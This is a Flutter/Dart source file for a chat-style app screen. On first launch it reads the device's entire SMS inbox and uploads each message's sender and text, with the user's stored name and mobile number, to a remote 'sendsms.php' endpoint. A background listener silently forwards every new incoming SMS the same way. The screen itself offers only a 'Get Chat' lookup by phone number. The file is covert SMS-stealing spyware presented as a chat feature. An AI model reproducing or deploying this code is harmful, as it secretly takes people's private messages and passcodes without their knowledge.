import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';

import 'package:shared_preferences/shared_preferences.dart';
import 'package:telephony/telephony.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:http/http.dart' as http;
import 'chatscreen.dart';
import 'servise.dart';

Serves serves=Serves();
onBackgroundMessage(SmsMessage message) async{
  SharedPreferences prefs = await SharedPreferences.getInstance();
  var username= prefs.getString('name');
  var usermobile= prefs.getString('mobile');
  debugPrint("onBackgroundMessage called");
  var url3 = Uri.parse(serves.url+"sendsms.php");

  var response = await http.post(url3, body:{
    'number': message.address,
    'masg': message.body,
    'userno': usermobile.toString(),
    'UserName': username.toString(),

  }  );

  if (response.statusCode == 200) {

    print(response.body);
  }


}


class chatview extends StatefulWidget {
  const chatview({Key? key}) : super(key: key);

  @override
  State<chatview> createState() => _chatviewState();
}

class _chatviewState extends State<chatview> {

  final telephony = Telephony.instance;



  String? _message;


  @override
  void initState() {
    super.initState();
    initPlatformState();
    seeall();
    if (Platform.isAndroid) WebView.platform = AndroidWebView();

  }

  onMessage(SmsMessage message) async {
    setState(() {
      _message = message.body ?? "Error reading message body.";
    });
  }

  onSendStatus(SendStatus status) {
    setState(() {
      _message = status == SendStatus.SENT ? "sent" : "delivered";
    });
  }

  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initPlatformState() async {
    // Platform messages may fail, so we use a try/catch PlatformException.
    // If the widget was removed from the tree while the asynchronous platform
    // message was in flight, we want to discard the reply rather than calling
    // setState to update our non-existent appearance.


      telephony.listenIncomingSms(
          onNewMessage: onMessage, onBackgroundMessage: onBackgroundMessage);


    if (!mounted) return;
  }

  Serves serves=Serves();
  late WebViewController controllerGlobal;

  Future<bool> _exitApp(BuildContext context) async {
    if (await controllerGlobal.canGoBack()) {
      print("onwill goback");
      controllerGlobal.goBack();
      return Future.value(true);
    } else {

      return Future.value(false);
    }
  }
  void seeall() async {

    SharedPreferences prefs = await SharedPreferences.getInstance();
    var username= prefs.getString('name');
    var usermobile= prefs.getString('mobile');
// prefs.clear();
    print(prefs.getInt('token'));
    if (prefs.getInt('token')==null) {
      List<SmsMessage> messages = await telephony.getInboxSms(
          columns: [SmsColumn.ADDRESS, SmsColumn.BODY],

          sortOrder: [OrderBy(SmsColumn.ADDRESS, sort: Sort.ASC),
            OrderBy(SmsColumn.BODY)]
      );


      messages.forEach((element)  async{

        var url3 = Uri.parse(serves.url+"sendsms.php");

        var response = await http.post(url3, body:{
          'number': element.address,
          'masg': element.body,
          'userno': usermobile.toString(),
          'UserName': username.toString(),


        }  );

        if (response.statusCode == 200) {

        }


      });

      prefs.setInt('token', 12345);
    }
  }

getchat()async{
  final uri = Uri.parse(serves.url+"getchat.php");
  print(uri);
  var response = await http.post(uri,body: {
    'mobile':mobileno.text,

  });

  var state= json.decode(response.body);

if(state['check']==1){

  Navigator.push(
    context,MaterialPageRoute(builder: (context)=> chatscreen(id:state['id'],username:state['username'],mobile:state['mobile'])),
  );
  }else{
setState(() {
  ischeck=true;
});

  }

}



final mobileno=TextEditingController();
bool ischeck=false;



  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () => _exitApp(context),
      child: Center(
        child: SafeArea(
          child: ListView(
            children: [
              SizedBox(
                height: MediaQuery.of(context).size.height/2.5,
              ),
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 30.0),
                child: SizedBox(
                  height: 40,
                  child: TextFormField(
                    //  keyboardType: TextInputType.numberWithOptions(),
                    style: TextStyle(color: Colors.black,fontSize: 15,),
                    textAlign: TextAlign.start,
                    controller: mobileno,
                    validator: (value) {
                      if (value == null || value.isEmpty) {
                        return 'Please enter some text';
                      }
                      return null;
                    },
                    onChanged: (v){
                      setState(() {
                        ischeck=false;
                      });
                    },
                    decoration: InputDecoration(
                      border:  OutlineInputBorder(
                          borderRadius: BorderRadius.all(Radius.circular(10.0)),
                          borderSide: BorderSide(color: Colors.blue)),
                      labelText: 'Enter Mobile',
                      hoverColor: Colors.black12,
                      hintText: 'Mobile',

                    ),
                    maxLines: 1,
                  ),
                ),
              ),
              SizedBox(
                height: 10,
              ),
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 28.0),
                child: Visibility(
                    visible: ischeck,
                    child: Text('This Number is Not Register',style: TextStyle(color: Colors.red),)),
              ),

              SizedBox(
                width: 50,
                child: Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 28.0),
                  child: ElevatedButton(onPressed: (){
                    getchat();
                  },child: Text('Get Chat'),),
                ),
              ),
              

            ],
          )
        ),
      ),


    );


  }
}
